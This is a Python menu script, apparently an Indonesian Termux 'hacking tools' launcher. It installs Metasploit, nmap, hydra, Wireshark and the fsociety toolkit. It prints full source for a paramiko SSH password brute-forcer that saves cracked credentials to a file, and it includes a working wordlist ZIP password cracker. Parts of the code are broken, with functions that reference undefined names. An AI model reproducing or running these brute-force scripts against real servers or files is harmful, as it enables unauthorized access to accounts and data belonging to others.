import sys
import time
import sys
import zipfile
import socket
import os
import subprocess
from tqdm import tqdm
from termcolor import colored

B = '\033[031m'

backtomenu_banner = B+ """
  [99] Kembali ke menu
  [00] Keluar dari tools \033[037m
"""

Kuhaku88 = {"nama":" Author   [] The X Kuhaku",
	    "kkl":"Youtube   [] Kuhaku Termux",
            "ll":"Team       [] The X Team"
           }

def restart_program():
        python = sys.executable
        os.execl(python, python, * sys.argv)
        curdir = os.getcwd()

def backtomenu():
        print(backtomenu_banner)
        backtomenu = str(input("Kuhaku > "))

        if backtomenu == "99":
                restart_program()
        elif backtomenu == "00":
                sys.exit()
        else:
                print ("\nERROR: Salah ngetik")
                time.sleep(0.3)
                restart_program()

def clearScr():
	subprocess.call('clear',shell=True)

class kuhaku:
	def __init__(self):
	    clearScr()
	    self.createFolders()

def completed(self):
        input("Completed, click return to go back")
        self.__init__()

def createFolders(self):
	if not os.path.isdir(toolDir):
	    os.makedirs(toolDir)
	if not os.path.isdir(logDir):
	    os.makedirs(logDir)

def metasploit_device_70():
    subprocess.call('figlet Metasploit',shell=True)
    subprocess.call('figlet Framework',shell=True)
    print("Metasploit-Framework Device 7.0")
    time.sleep(3)
    print('Install...')
    time.sleep(1)
    subprocess.call('apt update && apt upgrade',shell=True)
    subprocess.call('apt install unstable-repo -y',shell=True)
    subprocess.call('apt install ruby -y',shell=True)
    subprocess.call('apt install metasploit -y',shell=True)
    print('Installasi Selesai...')
    time.sleep(2)
    print('Cara Masuk Metasploit : ')
    time.sleep(0.7)
    print('Ketik $ msfconsole')
    time.sleep(0.8)
    print('Karena ini bakal masuk sendiri karena keinginan saya heheheh')
    time.sleep(0.9)
    print('Sedang Masuk Metasploit....')
    time.sleep(0.5)
    subprocess.call('msfconsole',shell=True)

def metasploit_device_60():
    subprocess.call('figlet Metasplpoit',shell=True)
    subprocess.call('figlet Framework',shell=True)
    print('Metasploit-Framework Device 6.0')
    time.sleep(2)
    print('Install...')
    time.sleep(1)
    subprocess.call('apt update && apt upgrade -y',shell=True)
    subprocess.call('apt install ruby',shell=True)

def yagmail():
    subprocess.call('clear',shell=True)
    subprocess.call('figlet Source Yagmail',shell=True)
    time.sleep(2)
    print("""
    import yagmail

    a=yagmail.SMTP('gmail','pw')
    subject='Example'
    body=str(input('Example'))
    a=send('gmail',subject,body)\n""")

def source_zipfile():
    subprocess.call('clear',shell=True)
    subprocess.call('figlet Source Brute-Zipfile',shell=True)
    time.sleep(2)
    print('''

import zipfile
from tqdm import tqdm

aa = input('---------')
bb = input('---------')

bb = zipfile.ZipFile(bb)
cc = len(list(open(aa, "r")))
print("------------", cc)

with open(aa, "r") as aa:
    for word in tqdm(aa, total=cc, unit="word"):
        try:
            bb.extractall(pwd=word.strip())
        except:
            continue
        else:
            print("------------", word.decode().strip())
            exit(0)
print("-------------")''')

def SSH():
    subprocess.call('figlet Source Brute-SSH',shell=True)
    print('''
import paramiko
import socket
import time
from colorama import init, Fore

init()

GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE


def is_ssh_open(hostname, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        print(f"{RED}--------- {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"------------- {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE}--------------- {RESET}")
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        print(f"{GREEN}-------:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
    parser.add_argument("-P", "--passlist", help="File that contain password list in each line.")
    parser.add_argument("-u", "--user", help="Host username.")

    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user
    passlist = open(passlist).read().splitlines()
    for password in passlist:
        if is_ssh_open(host, user, password):
            open("credentials.txt", "w").write(f"{user}@{host}:{password}")
            break
''')

def brute_zipfile():
    subprocess.call('clear',shell=True)
    subprocess.call('figlet Brute-ZipFile',shell=True)
    time.sleep(2)

    aa = input("Masukan Worldlist Anda : ")
    bb = input("Masukan File Zip Berpassword : ")

    bb = zipfile.ZipFile(bb)
    cc = len(list(open(aa, "r")))
    print("Total passwords yg di coba:", cc)

    with open(aa, "rb") as aa:
        for word in tqdm(aa, total=cc, unit="word"):
            try:
                bb.extractall(pwd=word.strip())
            except:
                continue
            else:
                print("[+] Password Ketemu cukk:", word.decode().strip())
                exit(0)
        print("[!] Password gk ketemu njir :v.")

'''
Source Kodingan Machine Dan Hacking
'''

def source():
    print(' [1] Yagmail')
    print(' [2] Brute_SSH_Server')
    print(' [3] Brute_ZipFile')
    print('')
    b=input('root@kuhaku:~# ')

    if b == '1':
       yagmail()
       backtomenu()
    elif b == '2':
       SSH()
       backtomenu()
    elif b == '3':
       source_zipfile()
       backtomenu()


'''
  8888888888    88888888     88     88
  88  88  88    88             88  88
      88        88888888         88
      88        88             88  88
      88        88888888     88      88


        8888888888    8888888    88888888    888    888
	88  88  88    88         88    88    8888  8888
	    88        8888888    88888888    88  88  88
 	    88        88         88    88    88      88
	    88        8888888    88    88    88      88
'''

def wires():
    subprocess.call('apt install x11-repo',shell=True)
    subprocess.call('apt install wireshark tigervnc',shell = True)
    print('')
    print('Langkah Mengakses Wireshark :')
    print('')
    print('1. Download VNC Viewer Di Play Store')
    print('2. Buka Termux Ketikkan $ vncserver')
    print('3. Lalu Buat Sebuah Password')
    print('4. Terus Buka VNC Viewer Nya Dan Pilih ( + ) ')
    print('5. Masukan (( localhost:1 )) (( Bebas ))')
    print('6. Masukan Password Yg Tadi Di Bikin')
    print('7. Cara Menggunakannya Kalian Cari Aja Tutorial nya')

def Nmap():
    subprocess.call('apt update && apt upgrade -y',shell=True)
    subprocess.call('apt install nmap -y',shell=True)

def hydra():
    subprocess.call('apt update && apt upgrade',shell=True)
    subprocess.call('apt install hydra',shell=True)

def Fso():
    subprocess.call('apt install python2 git',shell=True)
    subprocess.call('git clone https://github.com/manisso/fsociety',shell=True)
    subprocess.call('mv fsociety $HOME',shell=True)
    subprocess.call('cd /data/data/com.termux/files/home/fsociety',shell=True)

def my_codingan():
    print(' [1] Brute_ZipFile')
    mm=input('root@kuhaku:~# ')

    if mm == '1':
        brute_zipfile()

    elif mm == '2':
        print('Maaf Belum Ada')

    elif mm == '3':
        host2ip()

def logo1():
    subprocess.call("figlet The X",shell=True)
    subprocess.call("figlet  Kuhaku",shell=True)
    print(colored('  [ Version 0.1 ]','green'))
    print('')
    print(' Author   [] The X Kuhaku')
    print(' Youtube  [] Kuhaku Termux')
    print(' Team     [] The X Team')
    print('')

'''

  8888888888   8888888     88      88
  88  88  88   88 	     88  88
      88       8888888	       88
      88       88   	    88   88
      88       88888888   88       88


    88    88   88    88   88   88   88888888   88    88   88    88
    88  88     88    88   88   88   88    88   88  88     88    88
    8888       88    88   8888888   88888888   8888       88    88
    88  88     88    88   88   88   88    88   88  88     88    88
    88    88   88888888   88   88   88    88   88    88   88888888
'''

def Tool():
    print(" [1] Fsociety")
    print(" [2] Nmap")
    print(" [3] Hydra")
    print(" [4] Metasploit On Device 7.0")
    print(" [5] Metasploit On Device 6.0")
    print(" [6] Wireshark ( Recommended Device Version 7.0")
    print('')
    k=input('root@Kuhaku:\Tools\Hacking # ')

    if k == '1' or k == '01':
        Fso()
    
    elif k == '2' or k == '02':
        Nmap()

    elif k == '3' or k == '03':
        hydra()

    elif k == '4':
        metasploit_device_70()

    elif k == '5':
        print('Maaf Gan Belum Ada')
    
    elif k == '6':
        wires()

subprocess.call("clear",shell=True)

logo1()
print(" [1] Source Code Hacking & Machine Learn")
print(" [2] Tools Hacking")
print(" [3] Decompile")
print(" [4] My Codingan")
print('')
print(" [5] Info_Tools")
print('')
a=input("root@Kuhaku:~# ")

if a == '1' or a == '01':
    source()

elif a == '2' or a == '02':
    Tool()  

elif a == '3' or a == '03':
   print('belum ada')
   restart_program()

elif a == '4' or a == '04':
   my_codingan()

elif a == '5':
    subprocess.call('clear',shell=True)
    subprocess.call('cat etcf.txt',shell=True)

